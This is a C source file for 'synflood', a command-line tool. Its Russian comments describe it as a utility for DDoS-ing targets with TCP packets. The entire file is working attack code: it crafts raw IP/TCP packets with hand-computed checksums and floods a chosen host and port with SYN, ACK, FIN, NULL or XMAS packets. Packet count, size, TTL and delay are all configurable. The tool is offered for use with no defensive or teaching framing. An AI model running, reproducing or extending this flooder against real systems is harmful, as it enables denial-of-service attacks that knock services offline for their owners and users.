/*
 * synflood.c
 * by oldteam & lomaster
 * license GPL-3.0
 * - Сделано от души 2023.
 *
 * ОПИСАНИЕ:
 * Это утилита для дудоса TCP пакетами.
 * Основана на SYN сканирование, также использует
 * вычисление фейковой TCP суммы.
 *
 * CAPEC-287:
 * https://capec.mitre.org/data/definitions/287.html
*/

#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <string.h>
#include <time.h>
#include <netinet/tcp.h>

#define VERSION "0.1"

struct /*TCP флаги.*/
tcp_flags{
    u_int16_t syn_flag;
    u_int16_t ack_flag;
    u_int16_t rst_flag;
    u_int16_t fin_flag;
    u_int16_t psh_flag;
    u_int16_t urg_flag;
};

struct /*Настройки для отправки пакета.*/
send_opts{
    const char* source_ip;
    int buffer_size;
    unsigned int seq;
    int windows_size;
    int ip_header_ttl;
    int source_port;
    int delay_ms;
    int verbose;
    struct tcp_flags tcpf;
};

struct /*Для фейковой контрольной суммы TCP.*/
pseudo_header{
   uint32_t source_address;
   uint32_t dest_address;
   uint8_t placeholder;
   uint8_t protocol;
   uint16_t tcp_length;
   struct tcphdr tcp;
};

struct /*Опции программы.*/
program_opts{
    int port;
    int packets_count;
    int custom_tcp_flags;
};

uint32_t /*Алгоритм генерации рандомных чисел.*/
xorshift32(uint32_t* state);

unsigned int /*Генерация рандомного seq.*/
generate_seq();

int /*Для проверки root запуска.*/ 
check_root(void);

char* /*Угадайте.*/
dns_to_ip(char* dns);

int /*Получение IP компютера.*/
get_local_ip(char* buffer);

uint16_t /*Для всех расчётов контрольных сумм.*/
checksum_16bit(const uint16_t* data, int length);

int /*Сама функция по отправке TCP пакета.*/
send_tcp_packet(struct send_opts* sopt, int fd, const char* dest_ip,
	   int packets_count, int port);

void /*Для задержки.*/
delay(int milliseconds);

void /*Вывод лого.*/
logo(void);

void /*Для вывода меню помощи.*/
help_menu(void);

uint32_t xorshift32(uint32_t* state) {
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

unsigned int generate_seq() {
    static uint32_t state = 123456789;
    return xorshift32(&state);
}

int 
check_root(void){
    if (geteuid() == 0) {
        return 0; /*пользователь root*/
    } 
    else {
        return -1; /*пользователь не root*/
    }
}

char*
dns_to_ip(char* dns){
     struct hostent *he;
	struct in_addr **addr_list;
	int i;
		
	if ((he = gethostbyname(dns)) == NULL){
		return NULL;
	}
	addr_list = (struct in_addr**)he->h_addr_list;
	for(i = 0; addr_list[i] != NULL; i++){
		return inet_ntoa(*addr_list[i]) ;
	}
	return NULL;
}

int
get_local_ip(char* buffer){
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1){
	    return EOF;
	}
	struct sockaddr_in serv;
	const char* kGoogleDnsIp = "8.8.8.8";
	int dns_port = 53;

	memset( &serv, 0, sizeof(serv) );
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
	serv.sin_port = htons( dns_port );

	int err = connect(sock, (const struct sockaddr*)&serv, sizeof(serv));

	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*)&name, &namelen);

	const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

	close(sock);
	return 0;
}

uint16_t
checksum_16bit(const uint16_t* data, int length){
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length == 1){
        sum += *((uint8_t*)data);
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

int
send_tcp_packet(struct send_opts* sopts, int fd, const char* dest_ip,
	   int packets_count, int port){
    /*Буфер который будем слать.*/
    char datagram[sopts->buffer_size];
    memset(datagram, 0, sopts->buffer_size);

    /*Некоторые структуры.*/
    struct sockaddr_in dest;
    struct pseudo_header psh;

    /*Создание структур для заголовков.*/
    struct iphdr *iph_send = (struct iphdr*)datagram;
    struct tcphdr *tcph_send = (struct tcphdr*)(datagram + sizeof(struct iphdr));

    /*Заполнение IP заголовка.*/
    memset(iph_send, 0, sizeof(struct iphdr));
    iph_send->saddr = inet_addr(sopts->source_ip); /*Отправитель AKA мы.*/
    iph_send->daddr = inet_addr(dest_ip); /*Приниматель AKA хост.*/
    iph_send->ihl = 5;
    iph_send->tos = 0;
    iph_send->version = 4;
    iph_send->ttl = sopts->ip_header_ttl;
    iph_send->frag_off = IP_DF; /*Без фрагментации.*/
    iph_send->protocol = IPPROTO_TCP;
    iph_send->id = getpid() + sopts->seq;
    iph_send->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + sopts->buffer_size);
    iph_send->check = 0; /*Что-бы ядро не насрало.*/
    /*Расчёт контрольной суммы IP заголовка.*/

    int check_sum_ip = checksum_16bit((unsigned short *)datagram, iph_send->tot_len >> 4);
    iph_send->check = check_sum_ip;

    /*Заполнение TCP заголовка.*/
    memset(tcph_send, 0, sizeof(struct tcphdr));
    tcph_send->urg_ptr = htons(0);
    tcph_send->source = htons(sopts->source_port); /*Порт с которого шлём.*/
    tcph_send->dest = htons(port); /*На который шлём.*/
    tcph_send->seq = htonl(sopts->seq);
    tcph_send->ack_seq = htonl(0);
    tcph_send->check = 0; /*Как и с IP заголовком.*/
    /*Размер окна.*/
    tcph_send->window = htons(sopts->windows_size);
    tcph_send->doff = 7;
    /*Резервы, помоему никогда не будут юзаться.*/
    tcph_send->res1 = 0;
    tcph_send->res2 = 0;
    /*Установка флагов.*/
    tcph_send->syn = sopts->tcpf.syn_flag;
    tcph_send->ack = sopts->tcpf.ack_flag;
    tcph_send->fin = sopts->tcpf.fin_flag;
    tcph_send->rst = sopts->tcpf.rst_flag;
    tcph_send->psh = sopts->tcpf.psh_flag;
    tcph_send->urg = sopts->tcpf.urg_flag;

    /*Установка IP куда шлём.*/
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(dest_ip);

    /*Заполнение фейкового TCP заголовка.*/
    psh.source_address = iph_send->saddr;
    psh.dest_address = dest.sin_addr.s_addr; 
    psh.placeholder = 0;
    psh.protocol = iph_send->protocol;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    memcpy(&psh.tcp, tcph_send, sizeof(struct tcphdr));

    int success_packets = 0;
    clock_t start_time = clock();
    for (int i = 0; i < packets_count; i++){
	   /*Задержка.*/
	   delay(sopts->delay_ms);

	   /*Генерация рандомного seq.*/
	   tcph_send->seq = htonl(generate_seq());

	   /*Расчёт контрольной суммы TCP заголовка.
	   * На основе псевдо.*/
	   tcph_send->check = 0;
	   int check_sum_tcp = checksum_16bit((unsigned short*)&psh, sizeof(struct pseudo_header));
	   tcph_send->check = check_sum_tcp;

	   int send_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + sopts->buffer_size;
	   ssize_t send = sendto(fd, datagram, send_size, 0,
			 (struct sockaddr*)&dest, sizeof(dest));
	   if (sopts->verbose == 1){printf("[SENDTO]:%s >> %s:%d [ & ] size: %d [ & ] ttl: %d\n", sopts->source_ip, dest_ip, sopts->source_port, iph_send->tot_len, iph_send->ttl);fflush(stdout);}
	   if (send == -1){
		  if (sopts->verbose == 1){printf("^ FAILED & SENDTO: %s >> %s:0\n", sopts->source_ip, dest_ip);perror("sendto");fflush(stdout);}
	   }else {
		  success_packets++;
	   }

	   float progress = (float)i/ packets_count * 100.0;

	   if ((i + 1) % 1000 == 0) {printf("[%.f%%] sent %d packets\n", progress, i + 1);fflush(stdout);}
    }
    close(fd);
    clock_t end_time = clock();

    /*Расчёт времени выполнения.*/
    double execution_time_ms = (double)(end_time - start_time) * 1000.0 / CLOCKS_PER_SEC;
    printf("\nEnding SYN-Flood %d (success) packets at %.2fms\n", success_packets, execution_time_ms);

    return 0;
}

void
delay(int milliseconds){
    struct timespec ts;
    ts.tv_sec = milliseconds / 1000;
    ts.tv_nsec = (milliseconds % 1000) * 1000000;
    nanosleep(&ts, NULL);
}

/*Аргументы.*/
const char* short_opts = "hv";
const struct 
option long_opts[] = {
    {"help", no_argument, 0, 'h'},
    {"verbose", no_argument, 0, 'v'},

    {"delay", required_argument, 0, 1},
    {"count", required_argument, 0, 2},
    {"size", required_argument, 0, 3},
    {"window", required_argument, 0, 4},
    {"ttl", required_argument, 0, 5},
    {"custom-flags", no_argument, 0, 6},

    {"ssyn", required_argument, 0, 7},
    {"sack", required_argument, 0, 8},
    {"srst", required_argument, 0, 9},
    {"sfin", required_argument, 0, 10},
    {"spsh", required_argument, 0, 11},
    {"surg", required_argument, 0, 12},

    {"syn", no_argument, 0, 13},
    {"ack", no_argument, 0, 14},
    {"fin", no_argument, 0, 15},
    {"null", no_argument, 0, 16},
    {"xmas", no_argument, 0, 17},

    {"dest-port", required_argument, 0, 18},
    {"source-port", required_argument, 0, 19}
};
char* run; /*Для help меню.*/

int 
main(int argc, char** argv){
    run = argv[0];
    char* node; /*IP цели.*/
   
    struct send_opts sopt = {
	   .buffer_size = 1048,
	   .windows_size = 14600,
	   .delay_ms = 0,
	   .ip_header_ttl = 126,
	   .source_port = 4454,
	   .verbose = 0,
	   .seq = 0,
	   .source_ip = "none"
    };

    struct program_opts popt = {
	   .custom_tcp_flags = 0,
	   .port = 80,
	   .packets_count = 3000,
    };

    sopt.tcpf.rst_flag = 0;

    if (argc <= 1){help_menu(); return 0;}

    int rez, option_index = 0;
    while ((rez = getopt_long_only(argc, argv, short_opts, long_opts, &option_index)) != -1){
	   switch (rez) {
		  case 'h':
			 help_menu();
			 return 0;
			 break;
		  case 'v':
			 sopt.verbose = 1;
			 break;
		  case 1:
			 sopt.delay_ms = atoi(optarg);
			 break;
		  case 2:
			 popt.packets_count = atoi(optarg);
			 break;
		  case 3:
			 sopt.buffer_size = atoi(optarg);
			 break;
		  case 4:
			 sopt.windows_size = atoi(optarg);
			 break;
		  case 5:
			 sopt.ip_header_ttl = atoi(optarg);
			 break;
		  case 6:
			 popt.custom_tcp_flags = 1;
			 sopt.tcpf.syn_flag = 0;
			 sopt.tcpf.ack_flag = 0;
			 sopt.tcpf.rst_flag = 0;
			 sopt.tcpf.psh_flag = 0;
			 sopt.tcpf.fin_flag = 0;
			 sopt.tcpf.urg_flag = 0;
			 break;
		  case 7:
			 sopt.tcpf.syn_flag = atoi(optarg);
			 break;
		  case 8:
			 sopt.tcpf.ack_flag = atoi(optarg);
			 break;
		  case 9:
			 sopt.tcpf.rst_flag = atoi(optarg);
			 break;
		  case 10:
			 sopt.tcpf.fin_flag = atoi(optarg);
			 break;
		  case 11:
			 sopt.tcpf.psh_flag = atoi(optarg);
			 break;
		  case 12:
			 sopt.tcpf.urg_flag = atoi(optarg);
			 break;
		  case 13: /*SYN*/
			 sopt.tcpf.syn_flag = 1;
			 sopt.tcpf.ack_flag = 0;
			 sopt.tcpf.psh_flag = 0;
			 sopt.tcpf.fin_flag = 0;
			 sopt.tcpf.urg_flag = 0;
			 break;
		  case 14: /*ACK*/
			 sopt.tcpf.syn_flag = 0;
			 sopt.tcpf.ack_flag = 1;
			 sopt.tcpf.psh_flag = 0;
			 sopt.tcpf.fin_flag = 0;
			 sopt.tcpf.urg_flag = 0;
			 break;
		  case 15: /*FIN*/
			 sopt.tcpf.syn_flag = 0;
			 sopt.tcpf.ack_flag = 0;
			 sopt.tcpf.psh_flag = 0;
			 sopt.tcpf.fin_flag = 1;
			 sopt.tcpf.urg_flag = 0;
			 break;
		  case 16: /*NULL*/
			 sopt.tcpf.syn_flag = 0;
			 sopt.tcpf.ack_flag = 0;
			 sopt.tcpf.psh_flag = 0;
			 sopt.tcpf.fin_flag = 0;
			 sopt.tcpf.urg_flag = 0;
			 break;
		  case 17: /*XMAS*/
			 sopt.tcpf.syn_flag = 0;
			 sopt.tcpf.ack_flag = 0;
			 sopt.tcpf.psh_flag = 1;
			 sopt.tcpf.fin_flag = 1;
			 sopt.tcpf.urg_flag = 1;
			 break;
		  case 18:
			 popt.port = atoi(optarg);
			 break;
		  case 19:
			 sopt.source_port = atoi(optarg);
			 break;
	   }
    }

    /*Получение времени, и вывод запуска.*/
    time_t now = time(NULL);
    struct tm *t = localtime(&now); char datetime[20];
    strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", t);
    printf("Starting SYN-Flood %s at %s\n", VERSION, datetime);

    /*Проверка на запуск с root-ом.*/
    if (check_root() == -1){
	   printf("ERROR: Only (sudo) run. Fucking RAW sockets.\n");
	   return 1;
    }

    /*Получение IP компютера.*/
    char source_ip[20];
    get_local_ip(source_ip);
    printf("INFO: Source IP is: %s\n", source_ip);
    sopt.source_ip = source_ip;

    /*Выжимаем IP или DNS.*/
    if (optind < argc){
	   node = argv[optind];
    }

    /*Конвертация dns в IP.
	* Если был уже указан IP ничего не измениться.*/
    node = dns_to_ip(node);	   
    if (node != NULL){
	   printf("INFO: Target IP is: %s\n", node);
    }
    else {
	   printf("ERROR: dns_to_ip() failed resolve dns.\n");
	   return 1;
    }

    /*Создание сокета.*/
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1){
	   return -1;
    }
    /*Указываем ядру что мы будем слать кастомный IP заголовок,
	* и её нам не нужен.*/
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1){return 1;}

    /*Запускаем.*/
    send_tcp_packet(&sopt, sock, node, popt.packets_count, popt.port);
}

void
logo(void){
    puts("  ______   ___   _       _____ _     ___   ___  ____  ");
    puts(" / ___\\ \\ / / \\ | |     |  ___| |   / _ \\ / _ \\|  _ \\ ");
    puts(" \\___ \\\\ V /|  \\| |_____| |_  | |  | | | | | | | | | |");
    puts("  ___) || | | |\\  |_____|  _| | |__| |_| | |_| | |_| |");
    puts(" |____/ |_| |_| \\_|     |_|   |_____\\___/ \\___/|____/ ");
    puts("                                                      ");
}

void
help_menu(void){
    logo();
    printf("usage: %s [target] [flags]\n\n", run);
  
    puts("arguments program:");
    puts("  -h, -help             Show this help message.");
    puts("  -v, -verbose          On send verbose mode.\n");

    puts("arguments main:");
    puts("  -delay <ms>           Set delay before send.");
    puts("  -count <count>        Set count send packets.");
    puts("  -size <byte>          Set size send packets.");
    puts("  -window <size>        Set windows size.");
    puts("  -ttl <count>          Set TTL on IP header.\n");

    puts("arguments tcp flags:");
    puts("  -custom-flags         Reset all default flags.");
    puts("  -ssyn <1|0>           Set or unset syn flag.");
    puts("  -sack <1|0>           Set or unset ack flag.");
    puts("  -sfin <1|0>           Set or unset fin flag.");
    puts("  -srst <1|0>           Set or unset rst flag.");
    puts("  -spsh <1|0>           Set or unset psh flag.");
    puts("  -surg <1|0>           Set or unset urg flag.\n");

    puts("arguments type packets:");
    puts("  -syn                  Set send syn packets.");
    puts("  -fin                  Set send fin packets.");
    puts("  -xmas                 Set send xmas packets.");
    puts("  -null                 Set send null packets.");
    puts("  -ack                  Set send ack packets.\n");

    puts("arguments other:");
    puts("  -dest-port <port>     Set custom dest port.");
    puts("  -source-port <port>   Set custom source port.\n");

    puts("Created by lomaster & OldTeam");
}
